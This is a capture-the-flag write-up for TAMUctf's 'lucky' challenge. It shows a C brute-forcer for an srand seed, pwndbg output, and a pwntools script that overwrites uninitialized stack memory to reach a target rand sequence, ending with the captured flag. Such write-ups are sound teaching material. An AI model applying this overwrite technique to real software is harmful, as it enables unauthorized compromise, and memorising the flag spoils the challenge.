## Question

*Author: nhwn
*Feeling lucky? I have just the challenge for you :D
*SNI: lucky

## Solution

I just wrote a small C program to dertermine the value we needed to overwrite the seed with.

```c
int main() {

    setvbuf(stdout, NULL, _IONBF, 0);

    int i = 0;
 
    while (1==1) {

    srand(i);
    int key0 = rand() == 306291429;
    int key1 = rand() == 442612432;
    int key2 = rand() == 110107425;

    if (key0 && key1 && key2) {
        printf("seed = %i",i);
        exit(0);
    } 
    else {
     i = i +1;
    }
   }
}
```

Running,  tells us the seed must equal ```5649426```

```
$ gcc -o luck luck.c
$ ./luck
seed = 5649426

```

We will use this value to overwrite the local variable returned from seed into (e\|r)ax.

```
   0x00005555555552e4 <+53>:	call   0x5555555551f1 <seed>
   0x00005555555552e9 <+58>:	mov    edi,eax
   0x00005555555552eb <+60>:	call   0x555555555060 <srand@plt>
   0x00005555555552f0 <+65>:	call   0x5555555550a0 <rand@plt>
```

Next, I set a breakpoint at ```0x5555555552e9``` to determine how many bytes of padding are needed to overwrite ```eax```.


```
pwndbg> break *0x00005555555552e9
Breakpoint 1 at 0x5555555552e9
pwndbg> cyclic 25
aaaabaaacaaadaaaeaaafaaag
pwndbg> r
Starting program: /root/workspace/tamu-ctf/lucky/lucky 
Enter your name: aaaabaaacaaadaaaeaaafaaag
pwndbg> x/8 $rax
0x616164:	Cannot access memory at address 0x616164
```

We see that it takes 12 bytes. So the solution now is pretty straightforward, pad 12 bytes, then overflow the local variable in seed() with 5649426.

```python
from pwn import *
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="lucky")
    else:
        return process(e.path)

p = start()

pad = b'A'*12
seed = p64(5649426)

p.sendline(pad+seed)
p.interactive()
```

Running this gives our flag

```
{6:15}~/workspace/tamu-ctf/lucky ➭ python3 pwn-lucky.py BIN=./lucky REMOTE
[*] '/root/workspace/tamu-ctf/lucky/lucky'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/root/workspace/tamu-ctf/lucky/lucky'
[+] Opening connection to tamuctf.com on port 443: Done
[*] Switching to interactive mode
Enter your name: 
Welcome, AAAAAAAAAAAA\x12V
If you're super lucky, you might get a flag! GLHF :D
Nice work! Here's the flag: gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
```